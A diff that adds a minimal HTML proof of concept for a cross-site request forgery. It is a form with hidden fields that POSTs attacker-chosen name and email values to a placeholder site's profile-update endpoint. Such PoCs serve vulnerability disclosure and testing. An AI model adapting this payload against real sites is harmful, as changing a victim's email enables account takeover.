@@ -1,0 +1,13 @@
+<html>
+  <head>
+    <title>CSRF PoC</title>
+  </head>
+  <body>
+    <h1>CSRF PoC</h1>
+    <form action="https://example.com/user.update" method="POST">
+      <input type="hidden" name="name" value="Hacker">
+      <input type="hidden" name="email" value="hacker@example.com">
+      <input type="submit" value="Update profile">
+    </form>
+  </body>
+</html>
